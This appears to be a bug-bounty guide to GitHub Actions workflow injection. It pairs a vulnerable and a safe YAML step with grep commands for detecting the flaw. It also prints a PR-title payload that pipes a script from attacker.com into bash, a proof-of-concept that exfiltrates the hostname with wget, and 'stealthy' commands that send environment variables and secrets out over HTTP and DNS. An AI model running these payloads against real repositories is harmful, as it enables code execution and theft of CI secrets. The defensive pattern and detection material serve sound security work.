# Workflow Injection (Critical — Most Common Paid Bug)

GitHub Actions exposes PR/issue data as context variables. If injected into a
`run:` block without sanitization, an attacker controls shell code.

## Vulnerable vs safe pattern

```yaml
# VULNERABLE — attacker controls pr.title
- name: Print PR title
  run: echo "Title: ${{ github.event.pull_request.title }}"
  # Attacker PR title: "; curl attacker.com/shell.sh | bash #"

# SAFE — pass through env var, never interpolate directly
- name: Print PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $PR_TITLE"
```

## PoC payload

```
# PR title / issue title payload:
"; wget -q -O- attacker.com/$(cat /etc/hostname | base64) #
```

## Detection grep

```bash
grep -rn '\${{.*github\.event\.\(pull_request\|issue\|comment\|review\|discussion\)' .github/workflows/
grep -rn '\${{.*github\.head_ref' .github/workflows/
grep -rn '\${{.*github\.event\.inputs' .github/workflows/
```

## Exfil via DNS

```bash
curl "https://attacker.com/?d=$(printenv | base64 -w0)"
# Or via DNS (more stealthy)
nslookup "$(printenv SECRET | md5sum | cut -c1-20).attacker.com"
```
